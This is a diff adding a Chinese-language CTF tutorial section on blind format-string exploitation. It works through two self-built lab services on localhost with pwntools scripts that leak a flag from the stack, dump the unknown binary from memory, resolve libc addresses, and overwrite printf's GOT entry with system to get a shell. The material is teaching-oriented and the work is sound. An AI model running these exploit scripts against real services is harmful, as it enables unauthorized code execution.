@@ -732,4 +732,307 @@ sh.interactive()
 
 # 格式化字符串盲打
 
-待补充。
+## 原理
+
+所谓格式化字符串盲打指的是只给出可交互的ip地址与端口，不给出对应的binary文件来让我们进行pwn，其实这个和BROP差不多，不过BROP利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行
+
+- 确定程序的位数
+- 确定漏洞位置 
+- 利用
+
+由于没找到比赛后给源码的题目，所以自己简单构造了两道题。
+
+## 例子1-泄露栈
+
+源码和部署文件均放在了对应的文件夹fmt_blind_stack中。
+
+### 确定程序位数
+
+我们随便输入了%p，程序回显如下信息
+
+```shell
+➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
+%p
+0x7ffd4799beb0
+G�flag is on the stack%                          
+```
+
+告诉我们flag在栈上，同时知道了该程序是64位的，而且应该有格式化字符串漏洞。
+
+### 利用
+
+那我们就一点一点测试看看
+
+```python
+from pwn import *
+context.log_level = 'error'
+
+
+def leak(payload):
+    sh = remote('127.0.0.1', 9999)
+    sh.sendline(payload)
+    data = sh.recvuntil('\n', drop=True)
+    if data.startswith('0x'):
+        print p64(int(data, 16))
+    sh.close()
+
+
+i = 1
+while 1:
+    payload = '%{}$p'.format(i)
+    leak(payload)
+    i += 1
+
+```
+
+最后在输出中简单看了看，得到flag
+
+```shell
+////////
+////////
+\x00\x00\x00\x00\x00\x00\x00\xff
+flag{thi
+s_is_fla
+g}\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\xfe\x7f\x00\x00
+```
+
+## 例子2-盲打劫持got
+
+源码以及部署文件均已经在blind_fmt_got文件夹中。
+
+### 确定程序位数
+
+通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为64位。
+
+```shell
+➜  blind_fmt_got git:(master) ✗ nc localhost 9999
+%p
+0x7fff3b9774c0
+```
+
+这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。
+
+### 确定偏移
+
+在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下
+
+```shell
+➜  blind_fmt_got git:(master) ✗ nc localhost 9999
+aaaaaaaa%p%p%p%p%p%p%p%p%p
+aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
+```
+
+据此，我们可以知道格式化字符串的起始地址偏移为6。
+
+### 泄露binary
+
+由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入'\x00'字符的，，不然没法泄露怎么玩，，除此之后，输出必然是'\x00'截断的，这是因为格式化字符串漏洞利用的输出函数均是'\x00'截断的。。所以我们可以利用如下的泄露代码。
+
+```python
+#coding=utf8
+from pwn import *
+
+#context.log_level = 'debug'
+ip = "127.0.0.1"
+port = 9999
+
+
+def leak(addr):
+    # leak addr for three times
+    num = 0
+    while num < 3:
+        try:
+            print 'leak addr: ' + hex(addr)
+            sh = remote(ip, port)
+            payload = '%00008$s' + 'STARTEND' + p64(addr)
+            # 说明有\n，出现新的一行
+            if '\x0a' in payload:
+                return None
+            sh.sendline(payload)
+            data = sh.recvuntil('STARTEND', drop=True)
+            sh.close()
+            return data
+        except Exception:
+            num += 1
+            continue
+    return None
+
+def getbinary():
+	addr = 0x400000
+	f = open('binary', 'w')
+	while addr < 0x401000:
+		data = leak(addr)
+		if data is None:
+			f.write('\xff')
+			addr += 1
+		elif len(data) == 0:
+			f.write('\x00')
+			addr += 1
+		else:
+			f.write(data)
+			addr += len(data)
+	f.close()
+getbinary()
+```
+
+需要注意的是，在payload中需要判断是否有'\n'出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。
+
+### 分析binary
+
+利用ida打开泄露的binary，改变程序基地址，然后简单看看，可以基本确定源程序main函数的地址
+
+```assembly
+seg000:00000000004005F6                 push    rbp
+seg000:00000000004005F7                 mov     rbp, rsp
+seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
+seg000:00000000004005FE
+seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
+seg000:00000000004005FE                 lea     rax, [rbp-80h]
+seg000:0000000000400602                 mov     edx, 80h ; '€'
+seg000:0000000000400607                 mov     rsi, rax
+seg000:000000000040060A                 mov     edi, 0
+seg000:000000000040060F                 mov     eax, 0
+seg000:0000000000400614                 call    sub_4004C0
+seg000:0000000000400619                 lea     rax, [rbp-80h]
+seg000:000000000040061D                 mov     rdi, rax
+seg000:0000000000400620                 mov     eax, 0
+seg000:0000000000400625                 call    sub_4004B0
+seg000:000000000040062A                 mov     rax, cs:601048h
+seg000:0000000000400631                 mov     rdi, rax
+seg000:0000000000400634                 call    near ptr unk_4004E0
+seg000:0000000000400639                 jmp     short loc_4005FE
+```
+
+可以基本确定的是sub_4004C0为read函数，因为读入函数一共有三个参数的话，基本就是read了。此外，下面调用的sub\_4004B0应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个while 1的循环，一直在执行。
+
+### 利用思路
+
+分析完上面的之后，我们可以确定如下基本思路
+
+- 泄露printf函数的地址，
+- 获取对应libc以及system函数地址
+- 修改printf地址为system函数地址
+- 读入/bin/sh;以便于获取shell
+
+### 利用程序
+
+程序如下。
+
+```python
+#coding=utf8
+import math
+from pwn import *
+from LibcSearcher import LibcSearcher
+#context.log_level = 'debug'
+context.arch = 'amd64'
+ip = "127.0.0.1"
+port = 9999
+
+
+def leak(addr):
+    # leak addr for three times
+    num = 0
+    while num < 3:
+        try:
+            print 'leak addr: ' + hex(addr)
+            sh = remote(ip, port)
+            payload = '%00008$s' + 'STARTEND' + p64(addr)
+            # 说明有\n，出现新的一行
+            if '\x0a' in payload:
+                return None
+            sh.sendline(payload)
+            data = sh.recvuntil('STARTEND', drop=True)
+            sh.close()
+            return data
+        except Exception:
+            num += 1
+            continue
+    return None
+
+
+def getbinary():
+    addr = 0x400000
+    f = open('binary', 'w')
+    while addr < 0x401000:
+        data = leak(addr)
+        if data is None:
+            f.write('\xff')
+            addr += 1
+        elif len(data) == 0:
+            f.write('\x00')
+            addr += 1
+        else:
+            f.write(data)
+            addr += len(data)
+    f.close()
+
+
+#getbinary()
+read_got = 0x601020
+printf_got = 0x601018
+sh = remote(ip, port)
+# let the read get resolved
+sh.sendline('a')
+sh.recv()
+# get printf addr
+payload = '%00008$s' + 'STARTEND' + p64(read_got)
+sh.sendline(payload)
+data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
+sh.recv()
+read_addr = u64(data)
+
+# get system addr
+libc = LibcSearcher('read', read_addr)
+libc_base = read_addr - libc.dump('read')
+system_addr = libc_base + libc.dump('system')
+log.success('system addr: ' + hex(system_addr))
+log.success('read   addr: ' + hex(read_addr))
+# modify printf_got
+payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
+# get all the addr
+addr = payload[:32]
+payload = '%32d' + payload[32:]
+offset = (int)(math.ceil(len(payload) / 8.0) + 1)
+for i in range(6, 10):
+    old = '%{}$'.format(i)
+    new = '%{}$'.format(offset + i)
+    payload = payload.replace(old, new)
+remainer = len(payload) % 8
+payload += (8 - remainer) * 'a'
+payload += addr
+sh.sendline(payload)
+sh.recv()
+
+# get shell
+sh.sendline('/bin/sh;')
+sh.interactive()
+```
+
+这里需要注意的是这一段代码
+
+```python
+# modify printf_got
+payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
+# get all the addr
+addr = payload[:32]
+payload = '%32d' + payload[32:]
+offset = (int)(math.ceil(len(payload) / 8.0) + 1)
+for i in range(6, 10):
+    old = '%{}$'.format(i)
+    new = '%{}$'.format(offset + i)
+    payload = payload.replace(old, new)
+remainer = len(payload) % 8
+payload += (8 - remainer) * 'a'
+payload += addr
+sh.sendline(payload)
+sh.recv()
+```
+
+fmtstr_payload直接得到的payload会将地址放在前面，而这个会导致printf的时候'\x00'截断（**关于这一问题，pwntools目前正在开发fmt_payload的加强版，估计快开发出来了。**）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面8字节对齐的地方，并对payload中的偏移进行修改。需要注意的是
+
+```python
+offset = (int)(math.ceil(len(payload) / 8.0) + 1)
+```
+
+这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于'%order$hn'中order多出来的字符都不会大于8。具体的可以自行推导。
